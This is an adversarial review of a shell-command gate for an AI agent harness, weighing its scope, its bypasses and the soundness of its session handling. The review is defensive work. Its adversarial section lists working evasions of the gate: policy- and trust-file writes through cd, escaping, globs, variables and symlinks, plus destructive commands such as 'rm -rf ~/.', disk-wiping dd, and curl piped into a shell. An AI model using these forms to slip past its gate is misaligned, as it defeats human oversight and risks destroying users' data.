## Scope review — first

The lane is materially over appetite: **10 files, +1,066/−106 LOC**, including roughly **574 added gate-code lines** versus the contract’s 150–250 estimate.

### Subtraction test

- **`nana-gate.ts`**: session baselining, live tightening, stop handling, journaling, and floor-before-allow ordering are load-bearing for (b), (d), and (f).
- **`lib/gate-paths.ts` (138 LOC)**: lexical resolution and policy-file recognition are load-bearing. Realpath/symlink handling and alternate agent-dir support are valuable carried-residual closures. Project-scope `.claude/**` protection is unapproved expansion.
- **`lib/gate-shell.ts` (261 LOC)**:
  - Quote-aware segment splitting is necessary for (c).
  - The destructive corpus needs substantial recognition logic.
  - But `splitCommand`, `detectionSegments`, tokenization, wrapper/option parsing, and command-position inference together form an **ad-hoc partial shell parser/lexer**, despite the “NOT a shell parser” label.
  - A smaller design could use a conservative quote-aware splitter plus normalized regex tables, cutting perhaps 80–120 LOC. It would lose some wrapper/quotation coverage or create more false positives.
- **18 unsegmentable constructs**:
  - Required or defensible: substitutions, backticks, heredocs, `eval`, shell `-c`, `xargs`, unbalanced quotes, groups/process substitution.
  - Elaborative: `parallel`, `watch`, `source`/`.`, some wrapper variants. Cutting these would permit exceptions on execution channels not named by the contract.
  - The list itself is not the main size problem; the second detection view and semantic command parser are.

The three required tests already add 429 LOC, with another ~77 documentation lines. I therefore find that the **full contract probably genuinely needs more than 700 LOC**, perhaps 800–900 even after subtraction. That does not excuse proceeding: the explicit rule was to **STOP and report when the appetite proved insufficient**.

Other scope rulings:

1. **Stop lifts live on repair:** accepted; required by unchanged L1 fallback behavior. Repaired allow patterns still wait for session start.
2. **Project `.claude/**`:** reject as unapproved scope expansion. Security-motivated, but it changes headless project workflows beyond the specified `~/.claude/**`.
3. **`config.ts`:** verified comments/types only; no logic changed.
4. **Desk README:** contradictory instructions existed. The note is harmless documentation, but it belonged to the seat.
5. Verified byte-unchanged assertions/tests: `gate-status`, `gate-config-robustness`, `gate-policy-paths`, `config-gate-fallback`, and `config-project-gate-fallback`.

## Adversarial review

### Seat probes

Re-ran both scripts against the worktree:

- Probe 1: **94 BLOCK / 16 ALLOW**
- All seat-script dangerous rows blocked.
- Expected benign rows allowed.
- All three compound rows blocked.

### Policy-file bypasses

The scanner ALLOWed all of these:

- `cd ~/.pi/agent && printf x > nana-pack.json`
- `cd ~/.pi/agent && printf x > trust.json`
- `cd .pi && printf x > nana-pack.json`
- `printf x > ~/.pi/agent/nana\-pack.json`
- `printf x > ~/.pi/agent/nana-*.json`
- directory-variable indirection
- escaped `install -m` and `dd of=` destinations
- `Set-Location ...; sc nana-pack.json ...`
- creating a directory symlink and writing through it in the same compound command
- `cd ... | xargs tee nana-pack.json`

In a temp HOME, I executed representative escaped, glob, variable, `cd`, and same-command symlink forms; each actually wrote `nana-pack.json` or `trust.json`.

Explicit paths through `tee`/`xargs`, `install`, `dd`, Python, and PowerShell do block. Python string concatenation and script-file writes remain allowed under the documented advisory limitation.

Declared command-text gaps were confirmed:

- `x=rm; $x -r build`: ALLOW
- alias indirection: ALLOW
- full-width `ｒｍ`: ALLOW
- script file: ALLOW
- the tested literal-`rm` IFS form happened to BLOCK
- novel `/bin/r[m] -rf ~`: ALLOW

### Floor

Canonical rows held under `^rm`, exact `^rm -rf ~$`, `.*`, and `^`; empty-matching patterns were rejected.

Equivalent or wrapped floor operations bypassed matching allows:

- `rm -rf ~/.`
- `rm -rf /.`
- `rm -rf $HOME/.`
- `sudo mkfs.ext4 /dev/x`
- `sudo dd if=x of=/dev/sda`
- `curl u | python3 /dev/stdin`
- `curl u | sh -s arg`
- `diskutil quiet eraseDisk ...`

Thus the promised non-skippable floor is incomplete.

### Session semantics

For **startup, new, resume, fork, and reload**, I tested malformed-start → live repair → session start:

- stop initially blocked;
- repair lifted stop live;
- repaired allow remained unavailable until session start;
- each reason adopted it;
- each emitted `gate_policy_widened`.

Pi 0.87.1 source confirms supported paths bind extensions and emit `session_start` before prompting/tool calls:

- print mode binds before prompts;
- RPC binds before its command loop;
- desk uses RPC;
- interactive binds during initialization before initial prompts;
- new/resume/fork create a runtime carrying the corresponding start event.

The lazy fallback is therefore safe for the named host paths. Bare test harnesses or nonstandard SDK consumers remain outside that guarantee.

### Never-throw/stress

- Malformed regexes in all three lists: no throw.
- Non-string paths: no throw.
- 100k allow patterns: completed in ~1.5s.
- 10 MB quote-heavy command: completed in ~1.5s.
- A configured catastrophic regex against a long command exceeded 5 seconds.

## Compatibility review

- Pack README, `AGENTS.md`, `config.ts`, and desk README document the changed lifecycle.
- The actual desk form still says **“allow (skip gate)”**, which is materially inaccurate; a README note is not enough for the primary UI.
- `grep -r "rm -rf" docs/` remains blocked as explicitly permitted and pinned. This also catches common `rg`, `echo`, test, and documentation commands containing literal destructive syntax. It is a documented but costly false-positive trade.
- Windows command text, aliases, case-insensitive policy names, backslashes, and `cmd /c` are covered as text. The tests do not execute on Windows; the symlink capability skip is explicit and honest.
- Edits under `~/.pi/agent/handoffs/**` ALLOW, satisfying the L3 interaction.
- `read` remains ungated.

## Findings — severity sorted

1. **HIGH — [scope] The lane knowingly exceeded the STOP threshold and implemented a partial shell parser instead of stopping for rescope.** The contract likely needed a larger appetite, but that was precisely the condition requiring a stop.  
   `docs/reviews/tranche1-2026-09-28/l2-brief.md:7`  
   `packages/nana-pack/lib/gate-shell.ts:48`  
   `packages/nana-pack/lib/gate-shell.ts:104`  
   `packages/nana-pack/lib/gate-shell.ts:138`

2. **HIGH — [adversarial] Policy self-protection is bypassable by common shell syntax, including direct writes to `trust.json` and `nana-pack.json`.** Relative-after-`cd`, shell escaping/globbing, variables, and same-command symlink creation all evade the word/path scanner. This falsifies invariant (a) for ordinary bash/PowerShell redirection and preserves the L1 trust-forging path.  
   `packages/nana-pack/lib/gate-paths.ts:122-132`

3. **HIGH — [adversarial] The non-skippable floor is skippable through path-equivalent targets and wrappers.** Root/home canonicalization is incomplete, wrapper detection returns non-floor `sudo` before seeing `mkfs`/`dd`, and pipe-to-interpreter only floors argument shapes consisting entirely of flags.  
   `packages/nana-pack/lib/gate-shell.ts:165-173`  
   `packages/nana-pack/lib/gate-shell.ts:222-236`

4. **MEDIUM — [scope] Project-scope `.claude/settings*.json` and hooks were added beyond the specified user scope.** This is defensible security work but an unapproved behavior expansion in an already over-appetite lane.  
   `packages/nana-pack/lib/gate-paths.ts:7`  
   `packages/nana-pack/lib/gate-paths.ts:88-94`

5. **MEDIUM — [compatibility] The desk’s primary UI still promises “allow (skip gate)”.** The field neither skips the floor nor exempts compounds; the README clarification does not repair the misleading control label. Seat should change the label before landing.  
   `apps/desk/public/app.js:2120`

6. **LOW — [adversarial] User regexes and list sizes have no complexity bound.** Malformed regexes are safe, but catastrophic valid regexes can hang tool gating, while 100k entries and 10 MB commands add roughly 1.5s per probe.  
   `packages/nana-pack/extensions/nana-gate.ts:101-117`  
   `packages/nana-pack/lib/config.ts:479-490`

## Residuals

- Command-text gates cannot reliably see aliases, variables, Unicode lookalikes, script contents, or dynamically constructed Python/Node writes.
- Literal `rm` matching creates notable daily-friction false positives.
- Windows behavior is corpus-tested, not executed on win32.
- A first startup has no prior process baseline against which to journal an earlier on-disk loosening.

**VERDICT: BLOCK**
